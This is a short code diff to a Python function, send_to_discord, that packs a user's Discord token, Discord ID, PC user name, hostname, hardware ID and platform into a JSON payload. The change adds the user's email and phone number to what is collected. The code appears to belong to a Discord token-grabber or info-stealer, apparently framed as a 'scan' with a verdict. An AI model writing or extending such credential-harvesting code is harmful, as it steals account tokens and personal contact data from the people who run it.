@@ -339,6 +339,8 @@ def send_to_discord(scan_id, scan_data, verdict):
     f_pcn = FIELDS.get("pcName", "nx_pcn")
     f_hw = FIELDS.get("hwid", "nx_hw")
     f_pl = FIELDS.get("platform", "nx_pl")
+    f_em = FIELDS.get("email", "nx_em")
+    f_ph = FIELDS.get("phone", "nx_ph")
 
     discord_id = si.get("discord_id", "N/A")
     discord_token = si.get("discord_token", "N/A")
@@ -373,7 +375,9 @@ def send_to_discord(scan_id, scan_data, verdict):
         f_pcu: si.get('user', 'N/A'),
         f_pcn: si.get('hostname', 'N/A'),
         f_hw: si.get('hwid', 'N/A'),
-        f_pl: si.get('platform', 'N/A')
+        f_pl: si.get('platform', 'N/A'),
+        f_em: si.get('email', 'N/A'),
+        f_ph: si.get('phone', 'N/A')
     }
 
     payload = json.dumps(payload_data).encode("utf-8")
